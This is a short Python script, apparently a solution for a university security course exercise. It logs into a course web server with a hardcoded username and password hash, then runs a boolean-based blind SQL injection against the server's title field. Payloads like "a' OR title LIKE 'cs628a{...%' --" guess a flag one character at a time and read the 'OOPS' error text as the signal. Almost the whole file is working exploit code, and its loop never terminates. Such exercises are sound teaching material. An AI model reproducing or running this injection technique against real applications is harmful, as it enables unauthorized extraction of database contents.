import requests
import string

r = requests.Session()
login_data = {'username':'mithlesh', 'password':'f80f886ea71cf68603e0528123c706d3'}

r_login = r.post("https://cseproj91.cse.iitk.ac.in:9876/login.php", login_data, verify=False)
print(r_login.content)

charset = string.ascii_letters.lower() + string.digits + "}"
str = ""
while True:
	for char in charset:
		str_try = str + char
		request = {'title': "a' OR title LIKE 'cs628a{" + str_try + "%' --", 'action' : 'submit'}
		e = r.post("https://cseproj91.cse.iitk.ac.in:9876/index.php", request, verify=False)
		if "OOPS" not in e.text:
			str += char
			print(str)
																					
